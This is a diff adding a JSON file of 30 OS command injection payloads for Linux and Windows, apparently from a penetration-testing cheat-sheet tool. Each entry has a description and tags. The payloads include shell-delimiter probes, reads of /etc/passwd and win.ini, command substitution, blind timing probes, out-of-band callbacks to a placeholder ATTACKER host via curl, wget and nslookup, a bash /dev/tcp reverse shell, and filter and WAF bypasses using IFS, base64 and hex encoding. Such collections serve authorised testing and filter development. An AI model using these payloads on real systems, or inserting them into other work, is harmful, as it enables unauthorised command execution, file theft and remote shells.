@@ -1,0 +1,47 @@
+{
+  "meta": {
+    "name": "Command Injection",
+    "icon": "💻",
+    "description": "OS command injection payloads for Linux and Windows. Covers basic delimiters, substitution syntax, blind OOB detection, WAF bypass techniques, and Windows-specific variants.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 30
+  },
+  "payloads": [
+    {"id":1,"code":"; id","description":"Semicolon delimiter — appends id command after existing command","category":"basic","platform":["linux"],"tags":["basic","semicolon","probe"]},
+    {"id":2,"code":"| id","description":"Pipe delimiter — passes stdout to id command","category":"basic","platform":["linux"],"tags":["basic","pipe","probe"]},
+    {"id":3,"code":"& id","description":"Background operator — runs id concurrently","category":"basic","platform":["linux","windows"],"tags":["basic","background","probe"]},
+    {"id":4,"code":"|| id","description":"OR operator — executes id only if previous command fails","category":"basic","platform":["linux","windows"],"tags":["basic","or","probe"]},
+    {"id":5,"code":"&& id","description":"AND operator — executes id only if previous command succeeds","category":"basic","platform":["linux","windows"],"tags":["basic","and","probe"]},
+
+    {"id":6,"code":"127.0.0.1; id","description":"Full chained probe — works in parameters expecting an IP/hostname","category":"chaining","platform":["linux"],"tags":["chaining","ip"]},
+    {"id":7,"code":"127.0.0.1 | id","description":"Pipe-chained probe for ping-style parameters","category":"chaining","platform":["linux"],"tags":["chaining","ip","pipe"]},
+    {"id":8,"code":"127.0.0.1 && cat /etc/passwd","description":"AND chain reads /etc/passwd if ping succeeds","category":"chaining","platform":["linux"],"tags":["chaining","file-read"]},
+    {"id":9,"code":"127.0.0.1 ; ls -la /","description":"Semicolon chain — lists root directory contents","category":"chaining","platform":["linux"],"tags":["chaining","ls"]},
+
+    {"id":10,"code":"`id`","description":"Backtick command substitution — executes id inline","category":"substitution","platform":["linux"],"tags":["substitution","backtick"]},
+    {"id":11,"code":"$(id)","description":"Dollar-paren command substitution — modern bash form","category":"substitution","platform":["linux"],"tags":["substitution","dollar-paren"]},
+    {"id":12,"code":"$(cat /etc/passwd)","description":"Dollar substitution for arbitrary file read","category":"substitution","platform":["linux"],"tags":["substitution","file-read"]},
+    {"id":13,"code":"${IFS}id","description":"Internal Field Separator substitution — avoids literal space character","category":"substitution","platform":["linux"],"tags":["substitution","ifs"]},
+
+    {"id":14,"code":"; sleep 5","description":"Blind time-based probe — 5 second response delay confirms injection","category":"blind","platform":["linux"],"tags":["blind","time","sleep"]},
+    {"id":15,"code":"& ping -c 5 127.0.0.1","description":"Blind ping probe — ~5 second delay observable in response time","category":"blind","platform":["linux"],"tags":["blind","ping","timing"]},
+    {"id":16,"code":"; curl http://ATTACKER","description":"Blind OOB via curl — confirms RCE with HTTP callback to attacker server","category":"blind","platform":["linux"],"tags":["blind","oob","curl"]},
+    {"id":17,"code":"; wget -q http://ATTACKER","description":"Blind OOB via wget — alternative callback when curl is unavailable","category":"blind","platform":["linux"],"tags":["blind","oob","wget"]},
+    {"id":18,"code":"; nslookup ATTACKER","description":"Blind DNS-only OOB — works when HTTP egress is blocked","category":"blind","platform":["linux","windows"],"tags":["blind","oob","dns"]},
+    {"id":19,"code":"; bash -i >& /dev/tcp/ATTACKER/PORT 0>&1","description":"Blind reverse shell — confirms exec AND provides interactive shell","category":"blind","platform":["linux"],"tags":["blind","oob","revshell"]},
+
+    {"id":20,"code":";{echo,id}","description":"Brace expansion space bypass — avoids space character entirely","category":"filter-bypass","platform":["linux"],"tags":["bypass","brace","space"]},
+    {"id":21,"code":";id$@","description":"$@ null variable — expands to nothing, breaks keyword pattern matching","category":"filter-bypass","platform":["linux"],"tags":["bypass","null-var"]},
+    {"id":22,"code":";l''s /","description":"Empty string mid-word — 'l''s' → 'ls', breaks simple string filters","category":"filter-bypass","platform":["linux"],"tags":["bypass","empty-string","split"]},
+    {"id":23,"code":";`echo aWQ=|base64 -d`","description":"Base64-encoded 'id' decoded at runtime — bypasses static keyword detection","category":"filter-bypass","platform":["linux"],"tags":["bypass","base64","encoding"]},
+    {"id":24,"code":";\\/bin\\/id","description":"Escaped path separators — splits /bin/id with backslashes","category":"filter-bypass","platform":["linux"],"tags":["bypass","path","escape"]},
+    {"id":25,"code":";$'\\x69\\x64'","description":"Hex-escaped command — \\x69\\x64 decodes to 'id' at runtime","category":"filter-bypass","platform":["linux"],"tags":["bypass","hex","encoding"]},
+
+    {"id":26,"code":"& whoami","description":"Windows basic ampersand injection — appends whoami","category":"windows","platform":["windows"],"tags":["windows","basic","probe"]},
+    {"id":27,"code":"| whoami","description":"Windows pipe injection — passes output to whoami","category":"windows","platform":["windows"],"tags":["windows","pipe","probe"]},
+    {"id":28,"code":"& dir","description":"Windows directory listing via dir — confirms code execution","category":"windows","platform":["windows"],"tags":["windows","dir","probe"]},
+    {"id":29,"code":"& type C:\\windows\\win.ini","description":"Windows file read — reads win.ini to confirm injection","category":"windows","platform":["windows"],"tags":["windows","file-read"]},
+    {"id":30,"code":"& net user","description":"Windows local user enumeration via net user","category":"windows","platform":["windows"],"tags":["windows","enum","users"]}
+  ]
+}
